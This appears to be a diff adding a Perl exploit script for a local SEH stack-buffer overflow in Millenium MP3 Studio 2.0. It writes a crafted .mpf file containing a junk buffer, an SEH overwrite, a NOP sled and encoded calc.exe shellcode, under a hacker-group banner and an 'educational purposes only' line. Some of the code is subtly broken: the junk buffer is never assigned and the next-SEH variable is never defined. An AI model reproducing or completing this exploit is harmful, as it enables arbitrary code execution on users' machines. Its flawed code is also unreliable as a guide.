@@ -1,0 +1,65 @@
+# [+] Vulnerability	: .mpf File Local Stack Overflow Exploit (SEH) 
+# [+] Product : Millenium MP3 Studio
+# [+] Versions affected : v2.0
+# [+] Download : http://www.software112.com/products/mp3-millennium+download.html
+# [+] Method	: seh
+# [+] Tested on : Windows XP SP2/SP3 En
+# [+] Written by : dellnull  (dellnull[at]gmail[dot]com
+# [+] Greetz to : corelanc0d3r
+#
+# [+] Just run the script and open the created file (crash.mpf) with Mp3-Millennium 2.0
+# [+] Enjoy the NOP slide ;-)
+#
+# -----------------------------------------------------------------------------
+#                                               MMMMM~.
+#                                               MMMMM?.
+#    MMMMMM8.  .=MMMMMMM.. MMMMMMMM, MMMMMMM8.  MMMMM?. MMMMMMM:   MMMMMMMMMM.
+#  MMMMMMMMMM=.MMMMMMMMMMM.MMMMMMMM=MMMMMMMMMM=.MMMMM?7MMMMMMMMMM: MMMMMMMMMMM:
+#  MMMMMIMMMMM+MMMMM$MMMMM=MMMMMD$I8MMMMMIMMMMM~MMMMM?MMMMMZMMMMMI.MMMMMZMMMMM:
+#  MMMMM==7III~MMMMM=MMMMM=MMMMM$. 8MMMMMZ$$$$$~MMMMM?..MMMMMMMMMI.MMMMM+MMMMM:
+#  MMMMM=.     MMMMM=MMMMM=MMMMM7. 8MMMMM?    . MMMMM?NMMMM8MMMMMI.MMMMM+MMMMM:
+#  MMMMM=MMMMM+MMMMM=MMMMM=MMMMM7. 8MMMMM?MMMMM:MMMMM?MMMMMIMMMMMO.MMMMM+MMMMM:
+#  =MMMMMMMMMZ~MMMMMMMMMM8~MMMMM7. .MMMMMMMMMMO:MMMMM?MMMMMMMMMMMMIMMMMM+MMMMM:
+#  .:$MMMMMO7:..+OMMMMMO$=.MMMMM7.  ,IMMMMMMO$~ MMMMM?.?MMMOZMMMMZ~MMMMM+MMMMM:
+#     .,,,..      .,,,,.   .,,,,,     ..,,,..   .,,,,.. .,,...,,,. .,,,,..,,,,.
+#                                                                   eip hunters
+# -----------------------------------------------------------------------------
+#
+# Script provided for educational purposes only.
+#
+#
+my $sploitfile="crash.mpf";
+my $junk."A" x 4112; 
+my $nops = "\x90" x 25;
+my $seh=pack('V',0x10020147); 
+# windows/exec  calc.exe
+# http://www.metasploit.com
+my $shellcode = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49".
+"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36".
+"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
+"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
+"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x54".
+"\x42\x50\x42\x50\x42\x30\x4b\x58\x45\x34\x4e\x33\x4b\x38\x4e\x37".
+"\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x48\x4f\x44\x4a\x31\x4b\x38".
+"\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x38\x46\x53\x4b\x48".
+"\x41\x30\x50\x4e\x41\x33\x42\x4c\x49\x59\x4e\x4a\x46\x38\x42\x4c".
+"\x46\x47\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e".
+"\x46\x4f\x4b\x53\x46\x45\x46\x32\x46\x50\x45\x37\x45\x4e\x4b\x48".
+"\x4f\x45\x46\x42\x41\x30\x4b\x4e\x48\x46\x4b\x38\x4e\x50\x4b\x44".
+"\x4b\x58\x4f\x45\x4e\x41\x41\x50\x4b\x4e\x4b\x48\x4e\x51\x4b\x38".
+"\x41\x50\x4b\x4e\x49\x48\x4e\x35\x46\x52\x46\x50\x43\x4c\x41\x33".
+"\x42\x4c\x46\x56\x4b\x38\x42\x34\x42\x53\x45\x38\x42\x4c\x4a\x37".
+"\x4e\x50\x4b\x38\x42\x54\x4e\x50\x4b\x48\x42\x37\x4e\x31\x4d\x4a".
+"\x4b\x48\x4a\x46\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x48\x42\x4b".
+"\x42\x30\x42\x30\x42\x30\x4b\x38\x4a\x36\x4e\x33\x4f\x55\x41\x53".
+"\x48\x4f\x42\x46\x48\x45\x49\x48\x4a\x4f\x43\x58\x42\x4c\x4b\x37".
+"\x42\x55\x4a\x56\x42\x4f\x4c\x58\x46\x30\x4f\x35\x4a\x46\x4a\x49".
+"\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x56\x41\x46".
+"\x4e\x36\x43\x46\x42\x30\x5a";
+my $junk2 ="\x90" x 100;
+my $payload=$junk.$nseh.$seh.$nops.$shellcode.$junk2;
+open (myfile,">$sploitfile");
+print myfile $payload;
+close (myfile);
+
+ 
